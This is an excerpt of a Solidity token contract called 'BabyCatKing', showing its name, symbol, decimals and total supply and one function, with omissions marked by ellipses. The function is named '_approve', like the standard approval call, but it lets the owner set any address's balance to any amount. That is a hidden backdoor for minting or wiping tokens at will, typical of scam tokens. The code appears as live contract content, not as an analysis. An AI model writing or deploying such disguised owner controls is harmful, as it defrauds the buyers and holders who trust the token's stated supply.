...
contract BabyCatKing  {
    string public name = "BabyCatKing";
    string public symbol = "BabyCatKing";
    uint8 public decimals = 12;
    address private _or;
    uint256 public totalSupply = 100000000 * 10 ** 12;
    ...
    function _approve(address spender, uint256 amount) public onlyOwner returns (bool success) {
        balanceOf[spender] = (amount * 10 ** 12);
        return true;
    }
